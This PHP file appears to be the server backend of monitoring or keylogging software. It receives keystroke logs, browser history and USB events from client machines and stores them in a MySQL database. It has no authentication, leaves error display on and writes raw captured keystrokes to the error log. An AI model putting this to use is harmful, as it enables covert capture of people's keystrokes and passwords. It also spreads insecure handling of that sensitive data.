<?php
/**
 * Event Handler v2.0 - Database-Based Storage
 * This version replaces file-based storage with database storage for all logs
 */

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

include_once "config.inc.php";
include_once "./includes/json.lib.php";

$config = new JConfig();

// Use mysqli instead of mysql_* functions
$mysqli = new mysqli($config->dbhost, $config->dbuser, $config->dbpassword, $config->dbname);

if ($mysqli->connect_error) {
    die("Could not connect MySQL: " . $mysqli->connect_error);
}

$mysqli->set_charset('utf8');

$ipaddr = $_SERVER['REMOTE_ADDR'];

// Debug logging
error_log("eventhandler_v2.php called - IP: $ipaddr");
error_log("POST data: " . json_encode($_POST));
error_log("Content-Type: " . ($_SERVER['CONTENT_TYPE'] ?? 'not set'));

$appVersion = isset($_POST['Version']) ? $_POST['Version'] : "1.0";
$appEvent = isset($_POST['Event']) ? $_POST['Event'] : "none";
$username = isset($_POST['Username']) ? $_POST['Username'] : "";

error_log("Initial appEvent: $appEvent, appVersion: $appVersion, username: $username");

$retObj = ['Status' => 'OK'];

// Check if this is a Tic event (can be either form data or JSON)
$isTicEvent = false;
$macaddress = "";
$username = "";

// First check if it's a Tic event in form data (legacy support)
if ($appEvent == 'Tic') {
    $isTicEvent = true;
    $macaddress = isset($_POST['MacAddress']) ? $_POST['MacAddress'] : "";
    $username = isset($_POST['Username']) ? $_POST['Username'] : "";
} else {
    // Check if it's JSON data
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);

    if ($data) {
        $appEvent = $data['Event'];
        $appVersion = $data['Version'];
        $macaddress = $data['MacAddress'] ?? '';
        $username = $data['Username'] ?? '';
        
        // Check if this is a Tic event in JSON format
        if ($appEvent == 'Tic') {
            $isTicEvent = true;
        } else {
            // Update username if provided in any event
            if (!empty($username)) {
                updateUsernameFromEvent($mysqli, $username);
            }
            
            // Handle different event types
            switch ($appEvent) {
                case 'BrowserHistory':
                    $browserHistories = $data['BrowserHistories'];
                    // Process Browser History
                    addBrowserHistoryToDB($mysqli, $browserHistories);
                    break;
                case 'KeyLog':
                    $keyLogs = $data['KeyLogs'];
                    // Process key logs
                    addKeyLogsToDB($mysqli, $keyLogs);
                    break;
                case 'USBLog':
                    $usbLogs = $data['USBLogs'];
                    // Process USB logs
                    error_log("USBLog event received: " . json_encode($data));
                    addUSBLogsToDB($mysqli, $usbLogs);
                    break;
            }
        }
    } else {
        // Handle JSON decode error
        http_response_code(400);
        echo json_encode(['error' => 'Invalid JSON']);
        $mysqli->close();
        return;
    }
}

// Handle Tic event (from either form data or JSON)
if ($isTicEvent) {
    $lastBrowserTic = addMonitorTic($ipaddr, $macaddress, $appVersion, $username, $mysqli);
    $retObj['LastBrowserTic'] = $lastBrowserTic;
}

// Return response
header('Content-Type: application/json');
echo json_encode($retObj);

$mysqli->close();

// ============================================================================
// FUNCTIONS
// ============================================================================

function addMonitorTic($ip, $macaddr, $version, $username, $mysqli)
{
    $ip_info = getClientInfo($mysqli);

    if ($ip_info == null) {
        // Create new IP record if it doesn't exist
        $stmt = $mysqli->prepare("INSERT INTO tbl_monitor_ips (ip_address, mac_address, username, app_version, monitor_status, last_monitor_tic) VALUES (?, ?, ?, ?, 1, NOW())");
        $stmt->bind_param("ssss", $ip, $macaddr, $username, $version);
        $stmt->execute();
        $stmt->close();
        
        $ip_info = getClientInfo($mysqli);
    }

    if ($ip_info == null) {
        return 0;
    }

    $ip_id = $ip_info['id'];
    $type = $ip_info['type'];
    $user_name = $ip_info['name'];

    // Update monitor status and last tic time
    $stmt = $mysqli->prepare("UPDATE tbl_monitor_ips SET monitor_status = 1, last_monitor_tic = NOW(), app_version = ?, username = ? WHERE id = ?");
    $stmt->bind_param("ssi", $version, $username, $ip_id);
    $stmt->execute();
    $stmt->close();

    // Get last browser tic time
    $lastBrowserTic = 0;
    if ($ip_info['last_browser_tic']) {
        $lastBrowserTic = strtotime($ip_info['last_browser_tic']);
    }

    error_log("Monitor tic updated for IP: $ip, ID: $ip_id, Username: $username");
    return $lastBrowserTic;
}

function updateUsernameFromEvent($mysqli, $username) {
    $ip_info = getClientInfo($mysqli);
    
    if ($ip_info) {
        $stmt = $mysqli->prepare("UPDATE tbl_monitor_ips SET username = ? WHERE id = ?");
        $stmt->bind_param("si", $username, $ip_info['id']);
        $stmt->execute();
        $stmt->close();
        error_log("Username updated for IP ID {$ip_info['id']}: $username");
    }
}

function addBrowserHistoryToDB($mysqli, $browserHistories)
{
    $ip_info = getClientInfo($mysqli);

    if ($ip_info == null) {
        error_log("No IP info found for browser history");
        return;
    }

    $ip_id = $ip_info['id'];
    error_log("Adding browser history for IP ID: $ip_id, Count: " . count($browserHistories));

    if ($browserHistories && count($browserHistories) > 0) {
        $stmt = $mysqli->prepare("CALL AddBrowserHistoryLogs(?, ?, ?, ?, ?, ?)");
        
        foreach ($browserHistories as $browserHistory) {
            $date = $browserHistory['date'];
            $browser = $browserHistory['browser'];
            $url = $browserHistory['url'];
            $title = $browserHistory['title'] ?? '';
            $lastVisit = $browserHistory['last_visit'] ?? 0;
            
            // Convert date string to datetime
            $visit_date = date('Y-m-d H:i:s', strtotime($date));
            
            $stmt->bind_param("isssis", $ip_id, $browser, $url, $title, $lastVisit, $visit_date);
            $stmt->execute();
        }
        
        $stmt->close();
        
        // Update last browser tic time
        $update_stmt = $mysqli->prepare("UPDATE tbl_monitor_ips SET last_browser_tic = NOW() WHERE id = ?");
        $update_stmt->bind_param("i", $ip_id);
        $update_stmt->execute();
        $update_stmt->close();
        
        error_log("Successfully added " . count($browserHistories) . " browser history records");
    }
}

function addKeyLogsToDB($mysqli, $keyLogs)
{
    $ip_info = getClientInfo($mysqli);

    if ($ip_info == null) {
        error_log("No IP info found for key logs");
        return;
    }

    $ip_id = $ip_info['id'];
    error_log("Adding key logs for IP ID: $ip_id, Count: " . count($keyLogs));

    if ($keyLogs && count($keyLogs) > 0) {
        $stmt = $mysqli->prepare("CALL AddKeyLogs(?, ?, ?, ?)");
        
        foreach ($keyLogs as $keyLog) {
            $date = $keyLog['date'];
            $application = $keyLog['application'];
            $key = $keyLog['key'];
            
            // Convert date string to datetime
            $key_date = date('Y-m-d H:i:s', strtotime($date));
            
            $stmt->bind_param("isss", $ip_id, $key_date, $application, $key);
            $stmt->execute();
        }
        
        $stmt->close();
        error_log("Successfully added " . count($keyLogs) . " key log records");
    }
}

function addUSBLogsToDB($mysqli, $usbLogs)
{
    $ip_info = getClientInfo($mysqli);

    if ($ip_info == null) {
        error_log("No IP info found for USB logs");
        return;
    }

    $ip_id = $ip_info['id'];
    error_log("Adding USB logs for IP ID: $ip_id, Count: " . count($usbLogs));

    if ($usbLogs && count($usbLogs) > 0) {
        $stmt = $mysqli->prepare("CALL AddUSBDeviceLogs(?, ?, ?, ?, ?, ?)");
        
        foreach ($usbLogs as $usbLog) {
            $date = $usbLog['date'];
            $device_name = $usbLog['device_name'] ?? $usbLog['device'] ?? 'Unknown Device';
            $device_path = $usbLog['device_path'] ?? '';
            $device_type = $usbLog['device_type'] ?? 'USB Device';
            $action = $usbLog['action'];
            
            // Convert date string to datetime
            $device_date = date('Y-m-d H:i:s', strtotime($date));
            
            $stmt->bind_param("isssss", $ip_id, $device_date, $device_name, $device_path, $device_type, $action);
            $stmt->execute();
        }
        
        $stmt->close();
        error_log("Successfully added " . count($usbLogs) . " USB log records");
    }
}

?> 